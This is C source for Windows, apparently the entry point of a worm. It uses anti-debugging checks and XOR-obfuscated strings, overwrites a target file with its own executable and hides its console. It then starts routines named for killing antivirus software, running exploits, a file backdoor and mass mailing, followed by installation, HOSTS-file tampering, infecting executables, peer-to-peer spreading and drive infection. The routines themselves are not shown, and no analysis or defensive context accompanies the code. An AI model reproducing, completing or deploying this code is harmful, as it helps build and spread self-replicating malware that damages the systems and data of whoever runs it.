#include "data_globals.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stddef.h>   // for size_t

#pragma optimize("", off)
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

int main(int argc, char **argv, char **env)
{
    BOOL is_debugger_present;
    int result;
    DWORD last_error;
    HWND hWnd;
    CHAR local_110[256];

    // "Wer45bbrtb439" XOR'd with key 0x3E
    volatile char sz_mutex[] = {
        'W'^0x3E, 'e'^0x3E, 'r'^0x3E, '4'^0x3E, '5'^0x3E, 'b'^0x3E, 'b'^0x3E, 'r'^0x3E,
        't'^0x3E, 'b'^0x3E, '4'^0x3E, '3'^0x3E, '9'^0x3E, 0x00^0x3E
    };
    // "ConsoleWindowClass" XOR'd with key 0x7A
    volatile char sz_console_class[] = {
        'C'^0x7A, 'o'^0x7A, 'n'^0x7A, 's'^0x7A, 'o'^0x7A, 'l'^0x7A, 'e'^0x7A, 'W'^0x7A,
        'i'^0x7A, 'n'^0x7A, 'd'^0x7A, 'o'^0x7A, 'w'^0x7A, 'C'^0x7A, 'l'^0x7A, 'a'^0x7A,
        's'^0x7A, 's'^0x7A, 0x00^0x7A
    };

    is_debugger_present = IsDebuggerPresent();
    if (is_debugger_present == 0) {
        if (argc == 2) {
            GetModuleFileNameA(NULL, local_110, sizeof(local_110));
            if (strcmp(argv[1], local_110) != 0) {
                SetFileAttributesA(argv[1], FILE_ATTRIBUTE_NORMAL);
                CopyFileA(local_110, argv[1], FALSE);
            }
        }
        xor_decrypt(sz_mutex, sizeof(sz_mutex), 0x3E);
        CreateMutexA(NULL, FALSE, (char*)sz_mutex);
        last_error = GetLastError();
        if (last_error == ERROR_ALREADY_EXISTS) {
            result = 1;
        } else {
            AllocConsole();
            xor_decrypt(sz_console_class, sizeof(sz_console_class), 0x7A);
            hWnd = FindWindowA((char*)sz_console_class, NULL);
            ShowWindow(hWnd, SW_HIDE);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_AntiVirusTerminate, NULL, 0, NULL);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_ExploitMain, NULL, 0, NULL);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_FileBackdoor, NULL, 0, NULL);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_MassMailMain, NULL, 0, NULL);
            _Install();
            _HOSTSFile();
            _InfectExes();
            p2p_spread();
            InfectDrives();
            result = 0;
        }
    } else {
        result = 1;
    }
    return result;
}
#pragma optimize("", on)
